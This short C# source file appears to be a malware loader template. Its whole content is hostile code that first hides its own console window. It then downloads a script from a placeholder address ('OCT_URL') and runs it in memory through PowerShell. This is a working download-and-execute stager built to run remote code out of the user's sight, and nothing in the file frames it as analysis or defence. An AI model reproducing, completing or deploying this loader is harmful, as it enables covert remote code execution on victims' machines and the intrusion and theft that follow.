using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Net;
using System;

namespace TT
{
    class NoT
    {
	[DllImport("kernel32.dll")]
	static extern IntPtr GetConsoleWindow();
	
	[DllImport("user32.dll")]
	static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void Main()
        {

		var Console = GetConsoleWindow();
		ShowWindow(Console, 0);

		WebClient client = new WebClient();
		String code = client.DownloadString("OCT_URL");
		PowerShell ps = PowerShell.Create();
		ps.AddScript(code);
		ps.Invoke();



        }
    }
}
